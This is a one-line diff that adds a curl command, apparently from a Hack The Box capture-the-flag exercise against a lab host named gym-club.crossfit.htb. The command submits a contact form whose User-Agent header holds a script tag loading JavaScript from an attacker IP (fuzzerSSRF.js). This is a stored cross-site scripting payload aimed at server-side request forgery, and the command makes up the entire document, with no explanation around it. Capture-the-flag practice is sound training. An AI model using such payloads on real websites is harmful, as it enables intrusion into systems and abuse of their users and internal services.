@@ -1,0 +1,1 @@
+curl -s -X 'POST' \ -H "User-Agent: <script src="http://10.10.16.110/fuzzerSSRF.js"></script>" \ --data-binary 'name=hacked&email=hacked@htb&phone=12345&message=<script>&submit=submit' \ 'http://gym-club.crossfit.htb/blog-simple.php'
